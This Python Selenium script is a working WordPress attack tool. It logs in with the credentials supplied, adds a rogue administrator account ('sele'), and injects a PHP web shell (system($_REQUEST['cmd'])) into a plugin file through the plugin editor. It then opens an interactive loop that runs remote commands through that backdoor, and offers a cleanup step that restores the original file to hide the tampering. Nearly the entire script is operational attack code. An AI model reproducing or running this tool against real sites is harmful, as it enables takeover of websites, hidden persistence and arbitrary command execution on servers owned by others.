#!/usr/bin/python3

from selenium import webdriver
import argparse
import time
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.select import Select
import urllib.parse
import tkinter as tk
import logging
import sys
import pyperclip
from sympy import root

FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
LOG_LEVEL = 20 #logging.INFO
driver_path = "/home/kali/Desktop/Hacking-Python/python-hacking/src/selenium/chromedriver"

def info(string):
    if args.verbose:
        print(string.replace("\n",""))

def bye():
    time.sleep(1)
    driver.quit()
    exit()

def login(user, password):
    logging.info("Start Login")
    try:
        driver.get(args.url+'/wp-login.php')
        driver.find_element_by_name('log').clear()
        driver.find_element_by_name('pwd').clear()
        time.sleep(1)
        driver.find_element_by_name('log').send_keys(user)
        driver.find_element_by_name('pwd').send_keys(password)
        time.sleep(2)
        driver.find_element_by_name('wp-submit').click()

        #if 'Error' in driver.page_source:
        if 'wp-admin' not in driver.current_url:
            print("Invalider Login")
            bye()
    except:
        print("[!] Login Fail")
        exit(-1)
    logging.info('Login successful!')
  
def crate_user():
    logging.info('Create User')
    try:
        if 'users.php' not in driver.page_source:
            print('Current User have no Administartion rights')
            bye()
        driver.find_element_by_xpath("//a[@href ='users.php']").click()
        logging.info(driver.current_url)
        driver.find_element_by_xpath("//a[@href ='user-new.php']").click()
        logging.info(driver.current_url)
        time.sleep(1)
        # set user data
        driver.find_element_by_id('user_login').send_keys('sele')
        driver.find_element_by_id('email').send_keys('sele@example.de')
        driver.find_element_by_id('pass1').clear()
        driver.find_element_by_id('pass1').send_keys('pw123')
        time.sleep(1)
        driver.find_element_by_name('pw_weak').click()
        driver.find_element_by_id('role').send_keys('Administrator')
        driver.find_element_by_id('createusersub').click()
    except:
        print("[!] Crate User Fail")
        exit(-1)
    logging.info('Create User successful!')

def write_payload():
    global P_BACKUP
    payload = "<?php system($_REQUEST['cmd']); ?>"
    r = tk.Tk()
    r.withdraw()
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"a")
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"c")
    P_BACKUP = r.clipboard_get()
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(payload)
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.ENTER)
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"v")
    r.update()
    r.destroy()
    time.sleep(1)
    print(P_BACKUP)

def cleanup():
    driver.get(EDIT_PLUGIN_URL)
    time.sleep(1)
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"a")
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.DELETE)
    time.sleep(1)
    r = tk.Tk()
    r.withdraw()
    r.clipboard_append(P_BACKUP)
    driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"v")
    r.update()
    r.destroy()

    #driver.find_element_by_xpath("//div[@role='textbox']").send_keys(P_BACKUP)
    time.sleep(2)
    driver.find_element_by_xpath("//input[@value='Update File']").click()
    bye()

def edit_plugin():
    global EDIT_PLUGIN_URL
    #print(driver.get_window_size())
    driver.find_element_by_xpath("//a[@href ='tools.php']").click()
    print(driver.current_url)
    driver.find_element_by_xpath("//a[@href ='plugin-editor.php']").click()
    time.sleep(1)

    try:
        driver.find_element_by_class_name('file-editor-warning-dismiss').click()
    except:
        pass
    time.sleep(1)

    # Check All Plugins
    p_all = Select(driver.find_element_by_xpath("//select[@id='plugin']"))
    print("--- All Plugins ---")
    for p in p_all.options:
        print(f'[{p_all.options.index(p)}] - {p.text}')
    num = int(input('Select Plugin: '))
    p_name = p_all.options[num].text
    driver.find_element_by_id('plugin').send_keys(p_name)
    driver.find_element_by_xpath("//input[@value='Select']").click()

    # some try dont work fine
    #driver.find_element_by_xpath("//div[@role='textbox']").clear()
    #text = driver.find_element_by_xpath("//div[@role='textbox']").text

    write_payload()

    time.sleep(1)
    url_edit = urllib.parse.unquote(driver.current_url)
    f_name = url_edit.split('/')[-1].split('&')[0]
    p_name = url_edit.split('/')[-2].split('=')[-1]
    print(url_edit)
    print(f_name)
    print(p_name)
    EDIT_PLUGIN_URL = driver.current_url
    driver.find_element_by_xpath("//input[@value='Update File']").click()

    return p_name, f_name

def check_backdoor(p_name, f_name):
    driver.get(f'{args.url}/wp-content/plugins/{p_name}/{f_name}')
    print(urllib.parse.unquote(driver.current_url))
    if '404' in driver.page_source:
        print('Cant find the Backdoor')
        bye()
    print("Backdoor Online")    
    
def cmd():
    from bs4 import BeautifulSoup
    backdoor_path = driver.current_url
    while True:
        cmd = input("> ")
        if cmd == 'exit':
            bye()
        elif cmd == 'cleanup':
            cleanup()
        else:
            driver.get(f'{backdoor_path}?cmd={cmd}')
            cleantext = BeautifulSoup(driver.page_source, "lxml").text
            print(cleantext)

def main():
    print("\n-----------------------")
    login(args.user, args.password)
    time.sleep(1)
    if not args.skip:    
        crate_user()
        print(driver.current_url)
        time.sleep(1)
        login('sele','pw123')
        print(driver.current_url)
        time.sleep(1)
    p_name, f_name = edit_plugin()
    time.sleep(1)
    check_backdoor(p_name, f_name)
    cmd()

if __name__ == '__main__':
    logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=LOG_LEVEL)
    parser = argparse.ArgumentParser(description = 'Selenium')
    #group_enum = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('--url', required=True, type=str)
    parser.add_argument('-U', '--user', required=True, type=str)
    parser.add_argument('-P', '--password', required=True, type=str)
    #parser.add_argument('-nU', '--user', nargs='?', default=driver_path, type=str)
    #parser.add_argument('-NP', '--password', nargs='?', default=driver_path,, type=str)
    parser.add_argument('-s','--skip', action=argparse.BooleanOptionalAction, default=False, help='Skip Crate secound User with Admin rights')
    parser.add_argument('-d', '--driver', nargs='?', default=driver_path, type=str)
    parser.add_argument('--gui', action=argparse.BooleanOptionalAction, default=False)
    args = parser.parse_args()

    options = None
    if not args.gui:
        options = webdriver.ChromeOptions()
        #options.add_argument("log-level=3")
        #options.add_experimental_option('excludeSwitches', ['enable-logging'])
        options.add_argument('headless')
        options.add_argument("disable-gpu")
    
    driver = webdriver.Chrome(args.driver, chrome_options=options)
    driver.set_window_size(1100,900)
    main()


    
